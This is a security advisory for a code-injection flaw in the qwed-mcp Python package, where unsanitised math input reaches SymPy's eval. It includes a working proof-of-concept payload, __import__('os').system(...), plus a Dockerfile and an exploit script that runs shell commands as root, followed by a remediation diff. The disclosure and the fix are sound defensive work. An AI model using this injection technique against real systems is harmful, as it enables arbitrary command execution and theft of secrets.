# [C] qwed-mcp has Unsafe SymPy `parse_expr()` Remote Code Execution via Unsanitized Math Expression Input

## Summary
Severity: Critical
Advisory: GHSA-mw6r-2hvm-4rp2
CVE: CVE-2026-55546
CWE: CWE-94
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-08-25
Source: https://github.com/advisories/GHSA-mw6r-2hvm-4rp2
Type: github-advisory

## Affected
- PyPI: `qwed-mcp` — affected >=0 <0.2.1

## Details
### Summary

`verify_math_expression()` in `qwed-mcp` v0.2.0 passes attacker-controlled strings directly to SymPy's `parse_expr()` without restricting `global_dict` or validating the expression's AST. Because `parse_expr()` internally calls `eval()` and Python automatically injects the current module's `__builtins__` when no explicit restriction is set, an attacker can embed arbitrary Python expressions — including `__import__('os').system(...)` — to execute OS commands in the context of the running process. Confirmed exploitation in a Docker container yields root-level arbitrary command execution with no authentication or special configuration required.

### Details

The vulnerability resides in `src/qwed_mcp/engines/math_engine.py`. The public function `verify_math_expression(expression, claimed_result, operation)` accepts both the `expression` and `claimed_result` arguments as raw strings and passes them — after a trivial `^` → `**` substitution — to `sympy.parsing.sympy_parser.parse_expr()`:

```python
# math_engine.py:50-54
expr = parse_expr(
    expression.replace("^", "**"),
    local_dict={"x": x, "y": y, "z": z, "pi": pi, "e": E},
    transformations=transformations
)
```

```python
# math_engine.py:64-68
claimed = parse_expr(
    claimed_result.replace("^", "**"),
    local_dict={"x": x, "y": y, "z": z, "pi": pi, "e": E},
    transformations=transformations
)
```

`local_dict` only adds math symbols to the evaluation namespace; it does **not** remove `__builtins__`. SymPy's `parse_expr()` eventually calls Python's built-in `eval()`, which — absent an explicit `{"__builtins__": {}}` in `global_dict` — receives the full built-in namespace. This makes `__import__`, `open`, `exec`, and every other Python built-in available to the evaluated expression.

There is no allowlist, AST pre-validation, or sandboxing applied at any point before the `parse_expr()` calls (lines 50 and 64).

Data flow:

1. **Source** — `math_engine.py:13-16`: external caller supplies `expression` and `claimed_result`.
2. **Propagation** — `math_engine.py:50-54`: `expression` substituted and forwarded to `parse_expr()`.
3. **Propagation** — `math_engine.py:64-68`: `claimed_result` substituted and forwarded to `parse_expr()`.
4. **Sink** — `sympy.parsing.sympy_parser.parse_expr()`: calls `eval()` with unrestricted `__builtins__`.

### PoC

**Environment setup**

```bash
# Clone the repository at the affected commit
git clone https://github.com/QWED-AI/qwed-mcp
cd qwed-mcp
git checkout 54ac682699407310b5a71fbaed8c33f581b84301

# Option A — direct Python
python3 -m venv /tmp/qwed-mcp-venv
source /tmp/qwed-mcp-venv/bin/activate
pip install sympy>=1.12

# Option B — Docker (used for Phase 2 verification)
docker build -t vuln001-rce -f vuln-001/Dockerfile reports/pypiAi_1775_QWED-AI__qwed-mcp
docker run --rm vuln001-rce
```

**Exploit input**

```python
import importlib.util, sys, os

spec = importlib.util.spec_from_file_location(
    "qwed_mcp.engines.math_engine",
    "src/qwed_mcp/engines/math_engine.py"
)
mod = importlib.util.module_from_spec(spec)
sys.modules["qwed_mcp.engines.math_engine"] = mod
spec.loader.exec_module(mod)
verify_math_expression = mod.verify_math_expression

payload = "__import__('os').system('id > /tmp/vuln001_rce_output.txt && hostname >> /tmp/vuln001_rce_output.txt && touch /tmp/vuln001_rce_marker')"
verify_math_expression(payload, "0")

print("marker_exists:", os.path.exists("/tmp/vuln001_rce_marker"))
with open("/tmp/vuln001_rce_output.txt") as f:
    print(f.read())
```

**Expected output (Phase 2 Docker observation)**

```
[+] *** EXPLOIT SUCCESSFUL ***
[+] Marker file present : /tmp/vuln001_rce_marker
[+] RCE command output  :
--- BEGIN OUTPUT ---
uid=0(root) gid=0(root) groups=0(root)
2d2fe45d37b6
--- END OUTPUT ---

[RESULT] PASS — deterministic RCE evidence observed inside container
```

The marker file `/tmp/vuln001_rce_marker` is created and `id` output confirms execution as root with no patches, flags, or privileged configuration required.

**Remediation**

Apply AST allowlisting and restrict `global_dict` before every `parse_expr()` call:

```diff
--- a/src/qwed_mcp/engines/math_engine.py
+++ b/src/qwed_mcp/engines/math_engine.py
 import logging
+import ast
 from typing import Optional

+ALLOWED_NAMES = {"x", "y", "z", "pi", "e"}
+ALLOWED_FUNCS = {"sqrt", "sin", "cos", "exp", "log"}
+ALLOWED_AST = (
+    ast.Expression, ast.BinOp, ast.UnaryOp, ast.Call, ast.Name, ast.Load,
+    ast.Constant, ast.Add, ast.Sub, ast.Mult, ast.Div, ast.Pow, ast.Mod,
+    ast.USub, ast.UAdd,
+)
+
+def _validate_math_syntax(expr: str) -> None:
+    tree = ast.parse(expr.replace("^", "**"), mode="eval")
+    for node in ast.walk(tree):
+        if not isinstance(node, ALLOWED_AST):
+            raise ValueError(f"Unsupported syntax: {type(node).__name__}")
+        if isinstance(node, ast.Name) and node.id not in ALLOWED_NAMES | ALLOWED_FUNCS:
+            raise ValueError(f"Unsupported symbol: {node.id}")
+        if isinstance(node, ast.Call):
+            if not isinstance(node.func, ast.Name) or node.func.id not in ALLOWED_FUNCS:
+                raise ValueError("Only approved math functions are allowed")
+        if isinstance(node, ast.Constant) and not isinstance(node.value, (int, float)):
+            raise ValueError("Only numeric constants are allowed")
+
+safe_globals = {"__builtins__": {}}
+
-            expr = parse_expr(
+            _validate_math_syntax(expression)
+            expr = parse_expr(
                 expression.replace("^", "**"),
                 local_dict={"x": x, "y": y, "z": z, "pi": pi, "e": E},
+                global_dict=safe_globals,
                 transformations=transformations
             )
-            claimed = parse_expr(
+            _validate_math_syntax(claimed_result)
+            claimed = parse_expr(
                 claimed_result.replace("^", "**"),
                 local_dict={"x": x, "y": y, "z": z, "pi": pi, "e": E},
+                global_dict=safe_globals,
                 transformations=transformations
             )
```

### Impact

Any caller that passes attacker-controlled input to `verify_math_expression()` or any future MCP tool registration that exposes this function over a network interface is fully compromised. An attacker can:

- Execute arbitrary OS commands as the process user (demonstrated as root in Phase 2).
- Read, write, or delete files accessible to the process.
- Exfiltrate secrets (API keys, environment variables, credentials) from the process environment.
- Pivot to internal services reachable from the host.

The function is part of the public PyPI package `qwed-mcp`. Any downstream library consumer or service that wraps `verify_math_expression()` with user-supplied input is affected without additional configuration. While v0.2.0's default MCP tool registry does not expose this function as a registered tool, the library API is directly importable and exploitable by any code that calls it.

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
FROM python:3.12-slim

LABEL vuln="VULN-001" \
      title="Unsafe SymPy parse_expr() RCE" \
      cwe="CWE-94" \
      target="QWED-AI/qwed-mcp@0.2.0"

WORKDIR /app

# Copy only the package source tree from the cloned repo.
# math_engine.py only imports sympy at runtime; full project deps
# (qwed-finance, qwed-ucp, mcp, z3-solver, etc.) are NOT needed for this PoC.
COPY repo/src /app/src

# Install the single runtime dependency used by the vulnerable module.
RUN pip install --no-cache-dir "sympy>=1.12"

# Copy the proof-of-concept script.
COPY vuln-001/poc.py /app/poc.py

# Make qwed_mcp importable via the local source tree.
ENV PYTHONPATH=/app/src

CMD ["python3", "/app/poc.py"]
```

#### `poc.py`

```python
"""
VULN-001 Proof of Concept
=========================
Target  : QWED-AI/qwed-mcp v0.2.0
Module  : src/qwed_mcp/engines/math_engine.py
Function: verify_math_expression(expression, claimed_result, operation)

Root cause
----------
verify_math_expression() passes attacker-controlled strings directly to
sympy.parsing.sympy_parser.parse_expr() without restricting global_dict.
parse_expr() ultimately calls eval() with SymPy's namespace as globals.
Because that namespace does not set __builtins__ to {}, Python injects the
current module's builtins automatically, making __import__ available.

Attack
------
Inject a Python expression as the 'expression' or 'claimed_result' argument:
    __import__('os').system('<shell command>')

The system() call executes before parse_expr() tries to interpret the return
value as a SymPy expression.

Expected evidence of exploitation
----------------------------------
1. /tmp/vuln001_rce_marker  is created inside the container.
2. /tmp/vuln001_rce_output.txt contains the output of `id` and `hostname`.
3. The script exits 0; any other exit code means exploitation failed.
"""

import os
import sys


MARKER_FILE = "/tmp/vuln001_rce_marker"
OUTPUT_FILE = "/tmp/vuln001_rce_output.txt"


def run_poc() -> bool:
    """Run the PoC; return True on confirmed exploitation, False otherwise."""
    print("=" * 60)
    print("VULN-001 — Unsafe SymPy parse_expr() RCE — PoC")
    print("=" * 60)

    # --- Step 1: import the vulnerable function ---
    # qwed_mcp/__init__.py pulls in the full MCP server stack (mcp, httpx, etc.).
    # We load math_engine.py directly via importlib to exercise the vulnerable
    # module in isolation, exactly as an attacker who calls the library API would.
    print("[*] Importing vulnerable function via importlib (direct module load) ...")
    import importlib.util
    import sys as _sys

    _module_path = "/app/src/qwed_mcp/engines/math_engine.py"
    try:
        _spec = importlib.util.spec_from_file_location(
            "qwed_mcp.engines.math_engine", _module_path
        )
        _mod = importlib.util.module_from_spec(_spec)
        _sys.modules["qwed_mcp.engines.math_engine"] = _mod
        _spec.loader.exec_module(_mod)
        verify_math_expression = _mod.verify_math_expression
    except Exception as exc:
        print(f"[-] Import failed: {exc}")
        return False
    print(f"[+] verify_math_expression loaded from {_module_path}")

    # --- Step 2: craft the RCE payload ---
    # The payload is injected as the `expression` argument.
    # Shell commands:
    #   id         — prints current user/uid/gid (confirms arbitrary execution)
    #   hostname   — prints container hostname (confirms in-container execution)
    #   touch      — creates a marker file (machine-checkable evidence)
    shell_cmd = (
        f"id > {OUTPUT_FILE} && "
        f"hostname >> {OUTPUT_FILE} && "
        f"touch {MARKER_FILE}"
    )
    payload = f"__import__('os').system('{shell_cmd}')"
    print(f"\n[*] Injection payload (expression argument):\n    {payload}\n")

    # --- Step 3: call the vulnerable function ---
    print("[*] Calling verify_math_expression(payload, '0') ...")
    result = verify_math_expression(payload, "0")
    print(f"[*] Return value: {result}\n")

    # --- Step 4: verify exploitation evidence ---
    marker_exists = os.path.exists(MARKER_FILE)
    output_exists = os.path.exists(OUTPUT_FILE)

    if marker_exists and output_exists:
        with open(OUTPUT_FILE) as fh:
            rce_output = fh.read().strip()
        print("[+] *** EXPLOIT SUCCESSFUL ***")
        print(f"[+] Marker file present : {MARKER_FILE}")
        print(f"[+] RCE command output  :\n--- BEGIN OUTPUT ---\n{rce_output}\n--- END OUTPUT ---")
        return True

    # Partial evidence (marker only, no output, or vice-versa) still counts.
    if marker_exists:
        print("[+] *** EXPLOIT SUCCESSFUL (marker only) ***")
        print(f"[+] Marker file present : {MARKER_FILE}")
        return True

    print("[-] EXPLOIT FAILED — marker file not found")
    print(f"[-] Expected: {MARKER_FILE}")
    return False


def main() -> None:
    success = run_poc()
    if success:
        print("\n[RESULT] PASS — deterministic RCE evidence observed inside container")
        sys.exit(0)
    else:
        print("\n[RESULT] FAIL — could not confirm arbitrary code execution")
        sys.exit(1)


if __name__ == "__main__":
    main()
```

## References
- https://github.com/QWED-AI/qwed-mcp/security/advisories/GHSA-mw6r-2hvm-4rp2
- https://github.com/QWED-AI/qwed-mcp/pull/22
- https://github.com/QWED-AI/qwed-mcp/commit/362e61892052e250c56cb1ee852024d6f98c467b
- https://github.com/QWED-AI/qwed-mcp
- https://github.com/QWED-AI/qwed-mcp/releases/tag/v0.2.1
